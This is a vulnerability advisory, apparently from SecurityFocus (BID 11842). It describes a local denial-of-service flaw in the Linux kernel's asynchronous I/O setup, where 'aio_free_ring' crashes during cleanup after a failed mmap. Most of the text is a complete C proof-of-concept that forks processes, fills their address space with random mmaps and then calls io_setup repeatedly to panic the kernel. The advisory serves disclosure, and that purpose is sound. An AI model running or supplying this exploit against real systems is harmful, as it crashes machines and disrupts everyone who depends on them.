source: http://www.securityfocus.com/bid/11842/info

The Linux Kernel is reported prone to a local denial of service vulnerability. It is reported that the vulnerability exists due to a failure by 'aio_free_ring' to handle exceptional conditions.

This vulnerability requires that mmap() is employed to map the maximum amount of process memory that is possible, before the vulnerability can be triggered.

It is reported that when handing 'io_setup' syscalls that are passed large values, the Linux kernel 'aio_setup_ring' will attempt to allocate a structure of page pointers.

When a subsequent 'aio_setup_ring' mmap() call fails, 'aio_free_ring' attempts to clean up the page pointers, it will crash during this procedure triggering a kernel panic.

#include <signal.h>
#include <sys/mman.h>
#include <strings.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/wait.h>
#include <errno.h>
#include <stdio.h>
#include <syscall.h>
#include <stdlib.h>
#include <asm/unistd.h>

int seed_random(void) {
	int fp;
	long seed;

	fp = open("/dev/random", O_RDONLY);
	if (fp < 0) {
		perror("/dev/random");
		return 0;
	}

	if (read(fp, &seed, sizeof(seed)) != sizeof(seed)) {
		perror("read random seed");
		return 0;
	}

	close(fp);
	srand48(seed);

	return 1;
}

void bogus_signal_handler(int signum) {
}

void real_signal_handler(int signum) {
	exit(0);
}

void install_signal_handlers(void) {
	int x;
	struct sigaction zig;

	bzero(&zig, sizeof(zig));
	zig.sa_handler = bogus_signal_handler;
	for (x = 0; x < 64; x++) {
		sigaction(x, &zig, NULL);
	}

	zig.sa_handler = real_signal_handler;
	sigaction(SIGINT, &zig, NULL);
}

/* 
 * Repeatedly try to mmap various junk until we've (hopefully)
 * filled up the address space of this process.  The calls parameter
 * should be fairly high--100000 seems to work.
 */
void mmap_pound(int calls) {
	int x, fd;
	
	fd = open("/dev/zero", O_RDWR);
	if (fd < 0) {
		perror("/dev/zero");
		return;
	}

	for (x = 0; x < calls; x++) {
		mmap(0, lrand48(), PROT_NONE, MAP_PRIVATE, fd, lrand48());
	}

	close(fd);
}

/* 
 * Repeatedly call io_setup to trigger the bug.
 * 1000000 syscalls generally suffices to cause the oops.
 */
void iosetup_pound(int calls) {
	int x;
	char *ptr = NULL;

	for (x = 0; x < calls; x++) {
		syscall(__NR_io_setup, 65530, &ptr);
	}
}

/*
 * Trivial function to print out VM size.
 */
void examine_vmsize(void) {
	char fname[256];
	FILE *fp;

	snprintf(fname, 256, "/proc/%d/status", getpid());

	fp = fopen(fname, "r");
	if (fp == NULL) {
		perror(fname);
		return;
	}

	while (fgets(fname, 256, fp) != NULL) {
		if (strncmp(fname, "VmSize", 6) == 0) {
			printf("%.5d: %s", getpid(), fname);
			break;
		}
	}

	fclose(fp);
}

/*
 * Read parameters and fork off children that abuse first mmap and then
 * io_setup in the hopes of causing an oops.
 */
int main(int argc, char *argv[]) {
	int i, x, forks, mmap_calls, iosetup_calls;

	if (argc < 4) {
		printf("Usage: %s forks mmap_calls iosetup_calls\n", argv[0]);
		return 1;
	}

	forks = atoi(argv[1]);
	mmap_calls = atoi(argv[2]);
	iosetup_calls = atoi(argv[3]);

	printf("%.5d: forks = %d mmaps = %d iosetups = %d\n", getpid(), forks, mmap_calls, iosetup_calls);

	for (i = 0; i < forks; i++) {
		x = fork();
		if (x == 0) {
			/* new proc, so start pounding */
			printf("%.5d: initializing.\n", getpid());
			seed_random();
			install_signal_handlers();

			printf("%.5d: creating mmaps.\n", getpid());
			mmap_pound(mmap_calls);

			examine_vmsize();

			printf("%.5d: calling iosetup..\n", getpid());
			iosetup_pound(iosetup_calls);

			printf("%.5d: done pounding.\n", getpid());

			return 0;
		} else {
			printf("%.5d: forked pid %.5d.\n", getpid(), x);
		}
	}

	printf("%.5d: waiting for children.\n", getpid());
	for (i = 0; i < forks; i++) {
		wait(NULL);
	}
	printf("%.5d: exiting.\n", getpid());

	return 0;
}
